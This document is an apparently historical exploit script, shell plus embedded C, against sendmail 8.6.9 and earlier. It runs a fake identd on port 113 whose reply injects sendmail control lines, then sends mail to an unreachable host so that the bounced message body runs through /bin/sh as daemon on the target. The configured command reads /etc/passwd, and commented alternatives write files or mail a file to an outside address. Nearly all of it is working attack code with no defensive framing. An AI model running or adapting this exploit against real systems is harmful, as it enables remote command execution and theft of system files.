
it for sm869 or worse
# identd must not be enabled (port 113 must be free)

# this must be a host that mail can go to (MX not pointing elsewhere)
# that we cant reach right now (ie. host doesnt exist anymore)
UNREACHABLE="goofy.uhcc.hawaii.edu"

# Commands to run on remote host
COMMANDS="cat /etc/passwd"

# what host to run it on
TARGET="foobar.all.net"

# work in a temp dir
TD=/tmp/.Xwork.$$
mkdir $TD
cd $TD

cat > a.c <<_END_
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* run body of mail through shell run as daemon */
#define REPLY "USERID : UNIX : a\nC:daemon\nR\"|sed '1,/^$/d'|/bin/sh\"\nHXxx: "

#ifdef other_possibilities
/* write to a file as daemon */
#define REPLY "USERID : UNIX : a\nC:daemon\nR/tmp/writeme\nHXxx: "
/* send back a file to someone and erase it */
#define REPLY "USERID : UNIX : a\nD/tmp/sendtome\nRemmanuel@2600.com\nHXxx: "
#endif

readline(fd, buf, len)
char *buf;
{
    int i = 0;

    while(i < len && read(fd, &buf[i], 1) == 1 && buf[i]) {
       if(buf[i] == '\r' || buf[i] == '\n')
           break;
       i++;
    }
    buf[i] = '\0';
}

die(str)
char *str;
{
    perror(str); exit(1);
}

main()
{
    int s, s2, adlen;
    struct sockaddr_in ad;
    char buf[60];

    ad.sin_family = AF_INET;
    ad.sin_port = htons(113);
    ad.sin_addr.s_addr = INADDR_ANY;
    if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) die("socket");
    if(bind(s, (struct sockaddr *)&ad, sizeof(ad)) == -1) die("bind");
    if(listen(s, 1) == -1) die("listen");
    adlen = sizeof(ad);
    s2 = accept(s, (struct sockaddr *)&ad, &adlen);
    if(s2 == -1) die("accept");
    printf("Connection from %s port %d\n", 
        inet_ntoa(ad.sin_addr), ntohs(ad.sin_port));
    readline(s2, buf, 50);
    sprintf(buf + strlen(buf), " : %s\n", REPLY);
    write(s2, buf, strlen(buf));
}
_END_

# compile program
echo "compiling"
cc a.c -o ident
echo "running fake ident"
./ident &

# send to reomte
echo "talking to remote"
(
  sleep 1; echo "helo"
  sleep 1; echo "mail from: <dan>"
  sleep 1; echo "rcpt to: <bounce@$UNREACHABLE>"
  sleep 1; echo "data"
  echo "$COMMANDS"
  echo "."
  sleep 1; echo "quit"
  sleep 5
) | telnet $TARGET 25

# cleanup
cd /
rm -rf $TD
echo "done."


